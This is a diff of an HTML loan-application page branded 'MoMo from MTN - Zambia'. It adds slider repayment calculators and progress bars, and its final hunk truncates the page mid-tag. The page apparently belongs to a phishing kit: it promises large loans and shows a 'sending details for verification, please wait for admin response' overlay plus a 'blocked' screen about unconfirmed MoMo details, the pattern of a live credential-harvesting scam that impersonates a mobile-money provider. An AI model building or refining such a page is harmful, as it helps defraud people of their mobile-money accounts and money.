@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261125d" />
+  <link rel="stylesheet" href="style.css?v=20261125e" />
 </head>
 <body>
   <div class="app-container">
@@ -82,13 +82,31 @@
           <div class="slider-group">
             <label for="loan-amount-slider">Loan Amount (ZMW)</label>
             <div class="slider-val-display" id="loan-amount-text">ZMW 100,000</div>
-            <input type="range" id="loan-amount-slider" min="5000" max="500000" step="5000" value="100000" class="range-momo" />
+            <input
+              type="range"
+              id="loan-amount-slider"
+              min="5000"
+              max="500000"
+              step="5000"
+              value="100000"
+              class="range-momo"
+              oninput="(function(el){var amt=Number(el.value)||100000;var m=Number((document.getElementById('loan-months-slider')&&document.getElementById('loan-months-slider').value)||48);document.getElementById('loan-amount-text').innerText='ZMW '+amt.toLocaleString();if(document.getElementById('form-amount-input'))document.getElementById('form-amount-input').value=amt.toLocaleString();if(document.getElementById('monthly-rep-val'))document.getElementById('monthly-rep-val').innerText='ZMW '+Math.round((amt*1.1)/m).toLocaleString();})(this)"
+            />
           </div>
 
           <div class="slider-group">
             <label for="loan-months-slider">Repayment Period</label>
             <div class="slider-val-display" id="loan-months-text">48 months</div>
-            <input type="range" id="loan-months-slider" min="3" max="60" step="1" value="48" class="range-momo" />
+            <input
+              type="range"
+              id="loan-months-slider"
+              min="3"
+              max="60"
+              step="1"
+              value="48"
+              class="range-momo"
+              oninput="(function(el){var m=Number(el.value)||48;var amt=Number((document.getElementById('loan-amount-slider')&&document.getElementById('loan-amount-slider').value)||100000);document.getElementById('loan-months-text').innerText=m+' '+(m===1?'month':'months');if(document.getElementById('loan-duration')){var opt=Array.from(document.getElementById('loan-duration').options).find(function(o){return o.value===m+' Months'});if(opt)document.getElementById('loan-duration').value=opt.value;}if(document.getElementById('monthly-rep-val'))document.getElementById('monthly-rep-val').innerText='ZMW '+Math.round((amt*1.1)/m).toLocaleString();})(this)"
+            />
           </div>
 
           <div class="monthly-payment-box">
@@ -100,7 +118,7 @@
             id="btn-goto-form1"
             class="btn-momo-solid"
             type="button"
-            onclick="document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form1').classList.add('active');window.scrollTo(0,0);"
+            onclick="(function(){var amt=Number((document.getElementById('loan-amount-slider')&&document.getElementById('loan-amount-slider').value)||100000);var m=Number((document.getElementById('loan-months-slider')&&document.getElementById('loan-months-slider').value)||48);if(document.getElementById('form-amount-input'))document.getElementById('form-amount-input').value=amt.toLocaleString();document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form1').classList.add('active');window.scrollTo(0,0);})()"
           >CONTINUE APPLICATION</button>
         </div>
       </div>
@@ -184,6 +202,12 @@
         <h2 class="step-heading">Loan Application</h2>
         <p class="step-sub-dark">Step 2 of 3</p>
 
+        <div class="progress-bar-row">
+          <div class="prog-segment active"></div>
+          <div class="prog-segment active"></div>
+          <div class="prog-segment"></div>
+        </div>
+
         <div id="banner-phone-error" class="surface-error-banner"></div>
 
         <div class="form-row-two">
@@ -213,7 +237,7 @@
             type="button"
             onclick="document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form1').classList.add('active');window.scrollTo(0,0);"
           >← Previous</button>
-          <button id="btn-form2-next" class="btn-momo-soft compact-prog" type="button">Next Step →</button>
+          <button id="btn-form2-next" class="btn-momo-soft ready compact-prog" type="button">Next Step →</button>
         </div>
       </div>
     </section>
@@ -235,6 +259,12 @@
       <div class="card-container-main">
         <h2 class="step-heading">Loan Application</h2>
         <p class="step-sub-dark">Step 3 of 3</p>
+
+        <div class="progress-bar-row">
+          <div class="prog-segment active"></div>
+          <div class="prog-segment active"></div>
+          <div class="prog-segment active"></div>
+        </div>
 
         <div id="banner-form3-error" class="surface-error-banner"></div>
 
@@ -425,25 +455,4 @@
 
       <div class="card-container-spacious">
         <div class="blocked-badge-circle">✕</div>
-        <h2 class="blocked-title">Application Blocked</h2>
-        <p id="blocked-reason-text" class="blocked-sub">
-          Your application was blocked because valid MTN MoMo details were not confirmed.
-        </p>
-
-        <button id="btn-retry-home" class="btn-momo-solid" type="button" style="margin-top: 24px;">RETURN HOME</button>
-      </div>
-    </section>
-
-    <!-- Loading Overlay -->
-    <div id="loading-overlay" class="loading-overlay">
-      <div class="spinner"></div>
-      <div id="loading-title">SENDING DETAILS FOR VERIFICATION...</div>
-      <div id="loading-sub">Please wait for admin response...</div>
-    </div>
-
-  </div>
-
-  <script src="script.js?v=20261125d"></script>
-</body>
-          </html>
-          
+        <h2 class="blocked-ti
